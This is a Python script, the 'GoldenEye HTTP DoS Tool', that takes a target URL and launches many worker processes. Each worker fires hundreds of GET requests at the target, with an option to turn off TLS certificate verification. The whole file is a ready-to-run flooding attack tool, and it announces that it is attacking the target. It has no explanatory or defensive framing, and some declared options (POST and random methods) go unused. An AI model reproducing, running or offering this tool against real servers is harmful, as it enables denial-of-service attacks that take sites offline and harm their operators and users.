#!/usr/bin/env python3
import argparse
import random
import sys
import time
import urllib.parse
import http.client as HTTPCLIENT
from multiprocessing import Process, Manager
import ssl

# Constants
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500
DEBUG = False
SSLVERIFY = True

class GoldenEye:
    def __init__(self, url, workers, sockets):
        self.url = url
        self.manager = Manager()
        self.counter = self.manager.list([0, 0])
        self.workersQueue = []
        self.nr_workers = workers
        self.nr_sockets = sockets
        self.method = METHOD_GET

    def fire(self):
        print(f"Attacking {self.url} with {self.nr_workers} workers, {self.nr_sockets} connections each.")
        for i in range(self.nr_workers):
            worker = Striker(self.url, self.nr_sockets, self.counter)
            worker.start()
            self.workersQueue.append(worker)

        for worker in self.workersQueue:
            worker.join()

class Striker(Process):
    def __init__(self, url, nr_sockets, counter):
        super().__init__()
        self.url = url
        self.nr_sockets = nr_sockets
        self.counter = counter
        self.ssl = url.startswith("https")
        parsed_url = urllib.parse.urlparse(url)
        self.host = parsed_url.netloc
        self.path = parsed_url.path or "/"
        self.port = parsed_url.port or (443 if self.ssl else 80)

    def run(self):
        context = ssl._create_unverified_context() if not SSLVERIFY else None
        for _ in range(self.nr_sockets):
            try:
                conn = (
                    HTTPCLIENT.HTTPSConnection(self.host, self.port, context=context)
                    if self.ssl
                    else HTTPCLIENT.HTTPConnection(self.host, self.port)
                )
                conn.request("GET", self.path)
                response = conn.getresponse()
                if response.status == 200:
                    self.counter[0] += 1
                conn.close()
            except Exception as e:
                self.counter[1] += 1
                if DEBUG:
                    print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="GoldenEye HTTP DoS Tool")
    parser.add_argument("url", help="Target URL (e.g., http://example.com)")
    parser.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS, help="Number of workers (default: 10)")
    parser.add_argument("-s", "--sockets", type=int, default=DEFAULT_SOCKETS, help="Number of sockets per worker (default: 500)")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("-n", "--nosslcheck", action="store_true", help="Disable SSL certificate verification")

    args = parser.parse_args()

    global DEBUG, SSLVERIFY
    DEBUG = args.debug
    SSLVERIFY = not args.nosslcheck

    goldeneye = GoldenEye(args.url, args.workers, args.sockets)
    goldeneye.fire()

if __name__ == "__main__":
    main()
